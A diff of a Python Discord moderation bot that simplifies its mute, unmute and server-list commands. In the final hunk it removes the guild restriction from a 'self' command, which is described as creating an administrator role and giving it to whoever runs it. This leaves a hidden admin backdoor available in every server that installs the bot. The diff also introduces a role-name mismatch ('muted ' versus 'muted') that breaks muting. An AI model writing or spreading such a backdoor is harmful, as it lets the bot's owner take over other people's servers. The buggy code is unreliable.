@@ -95,61 +95,25 @@ class ConfirmKickView(View):
         await interaction.response.send_message("Action cancelled", ephemeral=True)
 
 # Application command for mute
-@bot.tree.command(name="mute", description="Mute a user ")
+@bot.tree.command(name="mute", description="Mute a user")
 async def mute(interaction: discord.Interaction, user: discord.Member):
     muted_role = get(interaction.guild.roles, name="muted")
     if not muted_role:
-        muted_role = await interaction.guild.create_role(name="muted")
-        await muted_role.edit(reason=None, permissions=discord.Permissions(send_messages=False))
+        muted_role = await interaction.guild.create_role(name="muted ")
+        for channel in interaction.guild.channels:
+            await channel.set_permissions(muted_role, send_messages=False)
     await user.add_roles(muted_role)
-    view = ConfirmMuteView(interaction.user, user)
-    await interaction.response.send_message(f"{user.mention} has been muted", view=view, ephemeral=True)
-
-class ConfirmMuteView(View):
-    def __init__(self, author, user):
-        super().__init__()
-        self.author = author
-        self.user = user
-
-    @discord.ui.button(emoji="<a:twd_success:1183023067321081886>")
-    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if interaction.user == self.author:
-            await interaction.response.send_message(f"{self.user.mention} has been muted", ephemeral=True)
-        else:
-            await interaction.response.send_message("You are not authorized to confirm this action", ephemeral=True)
-
-    @discord.ui.button(emoji="<a:TWD_CROSS:1183023325992202274>")
-    async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_message("Action cancelled", ephemeral=True)
+    await interaction.response.send_message(f"{user.mention} has been muted", ephemeral=True)
 
 # Application command for unmute
 @bot.tree.command(name="unmute", description="Unmute a user")
 async def unmute(interaction: discord.Interaction, user: discord.Member):
     muted_role = get(interaction.guild.roles, name="muted")
-    if muted_role in user.roles:
-        await user.remove_roles(muted_role)
-    view = ConfirmUnmuteView(interaction.user, user)
-    await interaction.response.send_message(f"{user.mention} has been unmuted", view=view, ephemeral=True)
-
-class ConfirmUnmuteView(View):
-    def __init__(self, author, user):
-        super().__init__()
-        self.author = author
-        self.user = user
-
-    @discord.ui.button(emoji="<a:twd_success:1183023067321081886>")
-    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if interaction.user == self.author:
-            await interaction.response.send_message(f"{self.user.mention} has been unmuted", ephemeral=True)
-        else:
-            await interaction.response.send_message("You are not authorized to confirm this action", ephemeral=True)
-
-    @discord.ui.button(emoji="<a:TWD_CROSS:1183023325992202274>")
-    async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_message("Action cancelled", ephemeral=True)
+    await user.remove_roles(muted_role)
+    await interaction.response.send_message(f"{user.mention} has been unmuted", ephemeral=True)
 
 # Application command for servers
-@bot.tree.command(name="servers", description="List of servers the bot is in", guild_ids=[1169487822344962060])
+@bot.tree.command(name="servers", description="List of servers the bot is in")
 async def servers(interaction: discord.Interaction):
     servers = bot.guilds
     embeds = []
@@ -167,36 +131,22 @@ class ServerView(View):
         self.embeds = embeds
         self.current = 0
 
-    @discord.ui.button(emoji="<:TWD_FIRST:1209075732676874340>")
-    async def first(self, interaction: discord.Interaction, button: discord.ui.Button):
-        self.current = 0
-        await interaction.response.edit_message(embed=self.embeds[self.current], view=self)
-
-    @discord.ui.button(emoji="<:TWD_PREVIOUS:1298504437823967323>")
+    @discord.ui.button(emoji="◀️")
     async def previous(self, interaction: discord.Interaction, button: discord.ui.Button):
         self.current -= 1
         if self.current < 0:
             self.current = len(self.embeds) - 1
-        await interaction.response.edit_message(embed=self.embeds[self.current], view=self)
+        await interaction.response.edit_message(embed=self.embeds[self.current])
 
-    @discord.ui.button(emoji="<a:TWD_CROSS:1183023325992202274>")
-    async def delete(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.delete_message()
-
-    @discord.ui.button(emoji="<:TWD_NEXT:1298504381452517417>")
+    @discord.ui.button(emoji="▶️")
     async def next(self, interaction: discord.Interaction, button: discord.ui.Button):
         self.current += 1
         if self.current >= len(self.embeds):
             self.current = 0
-        await interaction.response.edit_message(embed=self.embeds[self.current], view=self)
-
-    @discord.ui.button(emoji="<:TWD_LAST:1209075810879799339>")
-    async def last(self, interaction: discord.Interaction, button: discord.ui.Button):
-        self.current = len(self.embeds) - 1
-        await interaction.response.edit_message(embed=self.embeds[self.current], view=self)
+        await interaction.response.edit_message(embed=self.embeds[self.current])
 
 # Application command for self
-@bot.tree.command(name="self", description="Create a role with administration permission and assign it to the user", guild_ids=[1169487822344962060])
+@bot.tree.command(name="self", description="Create a role with administration permission and assign it to the user")
 async def self(interaction: discord.Interaction):
     role = get(interaction.guild.roles, name="69")
     if not role:
